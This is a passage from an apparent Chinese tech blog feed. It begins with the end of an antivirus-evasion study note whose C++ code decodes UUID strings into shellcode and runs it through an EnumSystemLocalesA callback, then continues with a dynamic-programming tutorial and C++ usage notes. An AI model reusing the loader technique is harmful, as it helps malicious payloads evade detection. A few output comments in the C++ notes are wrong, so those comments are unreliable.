遍历uuids数组,并将UUID转换回原始的shellcode,然后存储在buffer_backup地址</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; elems; i++) &#123;<br>RPC_STATUS status = <span class="hljs-built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)buffer_backup);<br><span class="hljs-keyword">if</span> (status != RPC_S_OK) &#123;<br><span class="hljs-built_in">CloseHandle</span>(buffer);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>buffer_backup += <span class="hljs-number">16</span>;<br>&#125;<br><span class="hljs-comment">// 使用 EnumSystemLocalesA 函数调用转换回的 shellcode</span><br><span class="hljs-built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)buffer, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 关闭内存句柄</span><br><span class="hljs-built_in">CloseHandle</span>(buffer);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/04/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Snipaste_2024-04-15_14-14-52.png"></p>]]></content>
    
    
    <categories>
      
      <category>红蓝对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法之动态规划</title>
    <link href="/2024/03/17/%E7%AE%97%E6%B3%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <url>/2024/03/17/%E7%AE%97%E6%B3%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<p>我一定要学会动态规划😭</p><span id="more"></span><p><a href="https://programmercarl.com/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html">参考文章</a></p><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p><strong>Dynamic Programming</strong></p><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><ol><li>把「原问题」分解为「若干个重叠的子问题」，每个子问题的求解过程都构成一个 <strong>「阶段」</strong>。在完成一个阶段的计算之后，动态规划方法才会执行下一个阶段的计算。</li><li>在求解子问题的过程中，按照「自顶向下的记忆化搜索方法」或者「自底向上的递推方法」求解出「子问题的解」，把结果存储在表格中，当需要再次求解此子问题时，直接从表格中查询该子问题的解，从而避免了大量的重复计算。</li></ol><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p><strong>最优子结构性质（类似贪心，最优全局解的情况下局部一定是最优的）</strong></p><p>动态规划中每一个状态一定是由上一个状态推导出来的，<strong>这一点就区分于贪心</strong>，贪心没有状态推导，而是从局部直接选最优的</p><p>重叠子问题性质<br>无后效性：前面部分的结果不会受后面部分的影响</p><p>动态规划问题的关键点在于<strong>「如何状态设计」</strong>和<strong>「推导状态转移条件」</strong>，还有各种各样的「优化方法」。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p><strong>对于动态规划问题，拆解为如下五步曲，这五步都搞清楚了，才能说把动态规划真的掌握了</strong></p><ol><li>确定dp数组（dp table）以及下标的含义</li><li>确定递推公式</li><li>dp数组如何初始化</li><li>确定遍历顺序</li><li>举例推导dp数组</li></ol><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="leetcode62：不同路径"><a href="#leetcode62：不同路径" class="headerlink" title="leetcode62：不同路径"></a>leetcode62：不同路径</h4><p>这是一道经典的二维DP题。</p><p>首先，我们确定<code>DP[i][j]</code>的含义是：走到i,j位置存在的不同路径。</p><p>那么如下图：机器人只能向下和向右走，则当前<code>DP[i][j]</code>只能从<code>DP[i-1][j]</code>和<code>DP[i][j-1]</code>方向来，所以显然递推公式为：</p><p><code>dp[i][j] = dp[i - 1][j] + dp[i][j - 1]</code></p><p><img src="/2024/03/17/%E7%AE%97%E6%B3%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/Snipaste_2024-04-27_15-10-32.png"></p><p>初始化第一排和第一列为1，因为是从上方和左侧来。</p><p>遍历，就按照题意，只能向下向右走，所以就是正常双重循环遍历</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">uniquePaths</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">// DP[i][j]:到达i,j位置存在的路径</span><br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">DP</span>( m , <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n,<span class="hljs-number">0</span>));<br>        <span class="hljs-comment">// 初始化</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m ; ++i)<br>        &#123;<br>            DP[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n ; ++i)<br>        &#123;<br>            DP[<span class="hljs-number">0</span>][i] = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-comment">// 递推公式：DP[i][j] = DP[i-1][j] + DP[i][j-1]</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m ; ++i)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; n; ++j)<br>            &#123;<br>                DP[i][j] = DP[i<span class="hljs-number">-1</span>][j] + DP[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> DP[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>动态规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++使用细节</title>
    <link href="/2024/03/12/Cpp%E4%BD%BF%E7%94%A8%E7%BB%86%E8%8A%82/"/>
    <url>/2024/03/12/Cpp%E4%BD%BF%E7%94%A8%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<p>学习算法过程中记录C++的使用细节问题</p><span id="more"></span><h2 id="语法细节"><a href="#语法细节" class="headerlink" title="语法细节"></a>语法细节</h2><h3 id="结构体的定义"><a href="#结构体的定义" class="headerlink" title="结构体的定义"></a>结构体的定义</h3><p>C++的关键字<code>struct</code>是从C语言中的<code>struct</code>继承过来的，但是与C语言中要求struct只能包含成员变量不一样。C++中，<code>struct</code>类似于<code>class</code>，既可以包含<strong>成员变量</strong>，又可以包含<strong>成员函数</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Student</span>&#123;<br>    <span class="hljs-type">char</span> *name; <span class="hljs-comment">//姓名</span><br>    <span class="hljs-type">int</span> age; <span class="hljs-comment">//年龄</span><br>    <span class="hljs-type">int</span> school_id; <span class="hljs-comment">//学号</span><br>&#125;;<br><span class="hljs-comment">//在定义结构体时，不能在结构体内初始化包含的那些变量,因为结构体声明只是创建一个新的数据类型，还不存在这种类型的变量实体。</span><br><br>Student xiaoming, jim; <span class="hljs-comment">//C++允许省略struct，在Student前面可以不加struct。定义结构体Student类型的变量xiaoming,jim。</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Student</span> xiaoming, jim; <span class="hljs-comment">//C风格的变量定义，在C++里面也没有问题，兼容。</span><br><br></code></pre></td></tr></table></figure><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><p>错误实例：重复定义了变量<code>j</code>，导致出错</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> j;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">5</span>;j++)<br>&#123;<br>&#125;<br>cout&lt;&lt;j&lt;&lt;endl;<span class="hljs-comment">//1而不是4</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数值处理"><a href="#数值处理" class="headerlink" title="数值处理"></a>数值处理</h3><p>设置浮点数小数位数：</p><p>如果不加 <code>fixed</code>，<code>setprecision(4)</code>会控制输出的有效数字为4位，因此会四舍五入取到小数点后一位，输出结果为 123.5。如果加上<code>fixed</code>，就会控制小数点后的位数，输出结果为 123.4568。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> num = <span class="hljs-number">123.456789</span>;<br>    cout &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">4</span>) &lt;&lt; num &lt;&lt; endl;  <span class="hljs-comment">// 输出结果为 123.5</span><br>cout &lt;&lt; fixed &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; num &lt;&lt; endl;  <span class="hljs-comment">// 输出结果为 123.45</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="传递二维数组作为参数"><a href="#传递二维数组作为参数" class="headerlink" title="传递二维数组作为参数"></a>传递二维数组作为参数</h3><p>可以用<strong>二维数组</strong>名作为实参或者形参，在被调用函数中对形参数组定义时可以可以指定所有维数的大小，也可以省略第一维的大小说明。如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Func</span><span class="hljs-params">(<span class="hljs-type">int</span> array[<span class="hljs-number">3</span>][<span class="hljs-number">10</span>])</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Func</span><span class="hljs-params">(<span class="hljs-type">int</span> array[][<span class="hljs-number">10</span>])</span></span>;<br></code></pre></td></tr></table></figure><h3 id="C-新特性"><a href="#C-新特性" class="headerlink" title="C++新特性"></a>C++新特性</h3><h4 id="基于范围的for循环"><a href="#基于范围的for循环" class="headerlink" title="基于范围的for循环"></a>基于范围的for循环</h4><p>与传统的 <code>for</code> 循环相比，基于范围的 <code>for</code> 循环自动处理迭代，避免了迭代器或下标可能引入的错误，使代码更加易于编写和理解。</p><ul><li><code>declaration</code> 是当前范围内元素的声明，通常是一个变量定义，这个变量会依次取得 <code>range</code> 中每个元素的值。</li><li><code>expression</code> 是要迭代的序列，可以是花括号括起来的初始化列表、数组、容器类对象等，也可以是返回 string 字符串和容器对象的函数。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (declaration : expression) &#123;<br>    <span class="hljs-comment">// 循环体</span><br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; elem : vec) &#123;<br>        elem *= <span class="hljs-number">2</span>; <span class="hljs-comment">// 将每个元素值翻倍</span><br>&#125;<br><span class="hljs-comment">//遍历容器类返回值</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; ch : <span class="hljs-built_in">return_str</span>()) &#123; <span class="hljs-comment">// 使用引用避免拷贝</span><br>        std::cout &lt;&lt; ch;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="auto关键字"><a href="#auto关键字" class="headerlink" title="auto关键字"></a>auto关键字</h4><p>使用 <code>auto</code> 关键字可以让编译器自动推断元素的类型，这在遍历复杂类型的容器时非常有用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;std::string&gt; strings = &#123;<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-string">&quot;World&quot;</span>, <span class="hljs-string">&quot;C++11&quot;</span>&#125;;<br>    <span class="hljs-comment">// 使用基于范围的for循环和auto关键字遍历vector</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; str : strings) &#123; <span class="hljs-comment">// 使用引用避免拷贝</span><br>        std::cout &lt;&lt; str &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 输出：Hello World C++11 </span><br></code></pre></td></tr></table></figure><h2 id="类库使用Tips"><a href="#类库使用Tips" class="headerlink" title="类库使用Tips"></a>类库使用Tips</h2><h3 id="devC-使用C-11"><a href="#devC-使用C-11" class="headerlink" title="devC++使用C++11"></a>devC++使用C++11</h3><p>1.【工具】-【编译选项】-【编译器】</p><p>2.找到“编译时加入以下命令”</p><p>3.填入“-std&#x3D;c++11”</p><p>4.点击确定</p><p> 完成以上步骤就ok！</p><h3 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h3><p><code>swap</code>:交换两个变量的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">swap</span>(a, b);<br></code></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p><code>to_string</code>: 将数字常量转为string</p><p><strong>不能使用时，string str &#x3D; char(2+’0’) + “123”;</strong></p><p>std::string str &#x3D; “sin(“;    str +&#x3D; char(num + ‘0’); &#x2F;&#x2F; 将整数转换为字符后拼接到字符串后面    str +&#x3D; “)”;</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">int</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">long</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">float</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">double</span> val)</span></span>;<br><span class="hljs-function">string <span class="hljs-title">to_string</span> <span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">double</span> val)</span></span>;<br></code></pre></td></tr></table></figure><p><code>substr(pos,len)</code>:提取从pos开始的len个字符</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>    <span class="hljs-comment">// 提取从位置 7 开始的 5 个字符，即 &quot;world&quot;</span><br>    string substr = str.<span class="hljs-built_in">substr</span>(<span class="hljs-number">7</span>, <span class="hljs-number">5</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;Substr: &quot;</span> &lt;&lt; substr &lt;&lt; std::endl; <span class="hljs-comment">// 输出: Substr: world</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pop_back()</code>:弹出最后一个字符</p><h3 id="cmath"><a href="#cmath" class="headerlink" title="cmath"></a>cmath</h3><p><code>pow()</code> :用于计算一个数的指数幂。它需要两个参数：底数和指数，并返回底数的指数幂结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">double</span> base = <span class="hljs-number">2.0</span>;<br>    <span class="hljs-type">double</span> exponent = <span class="hljs-number">3.0</span>;<br>    <span class="hljs-type">double</span> result = <span class="hljs-built_in">pow</span>(base, exponent);<br>    cout &lt;&lt; <span class="hljs-string">&quot;2^3 = &quot;</span> &lt;&lt; result &lt;&lt; endl; <span class="hljs-comment">// 输出: 2^3 = 8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>round()</code>:四舍五入到最近的整数</p><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><p><code>vector</code>初始化方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">vector&lt;<span class="hljs-type">int</span>&gt; ilist = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3.0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ilist5</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">3</span>)</span></span>;<span class="hljs-comment">//指定值初始化，ilist5被初始化为包含7个值为3的int</span><br></code></pre></td></tr></table></figure><p><code>push_back()</code>:压入任意类型数值</p><p><code>pop_back()</code>:没有返回值</p><p><code>back()</code>:最后一个值</p><p><code>begin()</code>:返回起始位置</p><p><code>end():</code>返回最后的位置</p><p><code>size()</code>:数组的长度</p><p>用vector实现二维数组：<code>vector&lt;vector&lt;int&gt;&gt; matrix(r,vector&lt;int&gt;(c,-1))</code>&#x2F;&#x2F;r为行数，c为列数</p><p><code>resize(nums.size()+k,0)</code>:重置vector长度</p><h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><p>**<code>sort</code>:**有三个参数<code>sort(begin, end, cmp)</code>，其中<code>begin</code>为指向数组的第一个元素的指针，<code>end</code>为指向数组的最后一个元素的下一个位置的指针，<code>cmp</code>参数为排序准则，<code>cmp</code>参数可以不写，如果不写的话，默认从小到大进行排序。如果我们想从大到小排序可以将cmp参数写为<code>greater&lt;int&gt;()</code>就是对<code>int</code>数组进行排序。如果我们需要按照其他的排序准则，那么就需要我们自己定义一个bool类型的函数来传入。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-type">int</span> num[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-built_in">sort</span>(num,num+<span class="hljs-number">10</span>,<span class="hljs-built_in">greater</span>&lt;<span class="hljs-type">int</span>&gt;());<br></code></pre></td></tr></table></figure><p>比如说我们按照每个数的个位进行从大到小排序，我们就可以根据自己的需求来写一个函数作为排序的准则传入到<code>sort()</code>中。<br>我们可以将这个函数定义为：<strong>返回值为<code>true</code>时就将<code>y</code>放到右侧</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span>&#123;<br><span class="hljs-keyword">return</span> x &gt; y;<br>&#125;<br><span class="hljs-built_in">sort</span>(nums,nums + n,cmp);<br></code></pre></td></tr></table></figure><p><strong><code>max</code></strong>:返回两个中的最大值</p><p><strong><code>min</code></strong>:返回两个中的最小值</p><p><strong><code>next_permutation</code></strong>:全排列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  vector&lt;<span class="hljs-type">char</span>&gt; chars = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br>  <span class="hljs-keyword">do</span> &#123;<br>    cout &lt;&lt; chars[<span class="hljs-number">0</span>] &lt;&lt; chars[<span class="hljs-number">1</span>] &lt;&lt; chars[<span class="hljs-number">2</span>] &lt;&lt; endl;<br>  &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">next_permutation</span>(chars.<span class="hljs-built_in">begin</span>(), chars.<span class="hljs-built_in">end</span>()));<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>map是STL的一个关联容器，它提供一对一的<a href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>。</p><p>关键字(key)，每个关键字只能在map中出现一次；<br>关键字的值(value)；</p><p>map以模板(泛型)方式实现，可以存储任意类型的数据，包括使用者自定义的数据类型。Map主要用于资料一对一映射(one-to-one)的情況，map內部的实现自建一颗<a href="https://so.csdn.net/so/search?q=%E7%BA%A2%E9%BB%91%E6%A0%91&spm=1001.2101.3001.7020">红黑树</a>，这颗树具有对数据自动排序的功能。在map内部所有的数据都是有序的，后边我们会见识到有序的好处。比如一个班级中，每个学生的学号跟他的姓名就存在著一对一映射的关系。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span>  <span class="hljs-comment">//注意，STL头文件没有扩展名.h</span></span><br><span class="hljs-keyword">typedef</span> map&lt;<span class="hljs-type">int</span>,CString&gt; MAP_INT_CSTRING;<span class="hljs-comment">//为了使用方便，可以对模板类进行一下类型定义</span><br><br>MAP_INT_CSTRING enumMap;<br><br></code></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>与<code>unordered_set</code>不同，底层是红黑树实现</p><p>使用之前必须加相应容器的头文件：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span> <span class="hljs-comment">// set属于std命名域的，因此需要通过命名限定，例如using std::set;</span></span><br></code></pre></td></tr></table></figure><p>定义的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; a; <span class="hljs-comment">// 定义一个int类型的集合a</span><br><span class="hljs-comment">// set&lt;int&gt; a(10); // error，未定义这种构造函数</span><br><span class="hljs-comment">// set&lt;int&gt; a(10, 1); // error，未定义这种构造函数</span><br><span class="hljs-function">set&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">b</span><span class="hljs-params">(a)</span></span>; <span class="hljs-comment">// 定义并用集合a初始化集合b</span><br><span class="hljs-function">set&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">b</span><span class="hljs-params">(a.begin(), a.end())</span></span>; <span class="hljs-comment">// 将集合a中的所有元素作为集合b的初始值</span><br></code></pre></td></tr></table></figure><p>除此之外，还可以直接使用数组来初始化向量：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> n[] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span 